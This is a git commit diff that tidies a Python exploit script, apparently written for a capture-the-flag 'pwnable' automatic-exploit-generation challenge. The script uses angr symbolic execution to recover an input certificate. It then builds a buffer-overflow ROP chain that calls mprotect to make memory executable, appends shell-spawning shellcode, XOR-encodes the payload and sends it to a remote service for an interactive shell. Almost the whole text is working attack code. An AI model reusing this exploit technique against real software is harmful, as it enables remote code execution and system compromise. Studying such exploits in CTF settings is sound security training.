91604d7960f5a40cc21d158636607d45e42687f6
rot256 <rot256@users.noreply.github.com>
2016-04-02 17:12:02 +0200

    Cleaned code

--- pwnable/aeg/attack.py
+++ pwnable/aeg/attack.py
@@ -33,21 +33,12 @@ start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))
 # Setup stepper
 pg = p.factory.path_group(start_state)
 def step_func(pg):
-    print pg
     pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
     pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
     return pg
 pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
-print pg.errored
 f = pg.found[0]
-print f.state
 cert = f.state.se.any_str(buf)
-
-# FIXED
-
-# Create killstring
-# cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
-# cert = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
 print cert.encode('hex')
 
 # Payload layout
@@ -60,7 +51,7 @@ shellcode_addr = loc['buf_loc'] + shellcode_offset
 print 'Mprotect arguments @ 0x%x' % mprotect_addr
 print 'Shellcode @ 0x%x' % shellcode_addr
 
-# First RIP override (load gadget)
+# First RIP override (jump to load gadget)
 kill = ''
 kill += cyclic(loc['overflow_size'], alphabet = 'ABCD')
 kill += p64(mprotect_addr + loc['load_offset'])
@@ -78,7 +69,7 @@ kill += p64(0x10000)                        # RSI
 kill += p64(0x7)                            # RDX
 kill += p64(page)                           # RAX (sometimes RDI <- RAX)
 
-# Run primary rop chain
+# Run second rop chain
 kill += cyclic(loc['load_offset'] - 0x30, n = 8)   # Get to RBP (RBP now points here)
 kill += p64(loc['buf_loc'] + 0x600)
 kill += p64(loc['plt_mprotect'])
@@ -90,6 +81,5 @@ kill += asm(shellcraft.sh())
 
 # Write payload
 payload = xor(cert + kill, loc['pad'], cut = 'max')
-write('sploit', payload.encode('hex'))
 conn.sendline(payload.encode('hex'))
 conn.interactive()
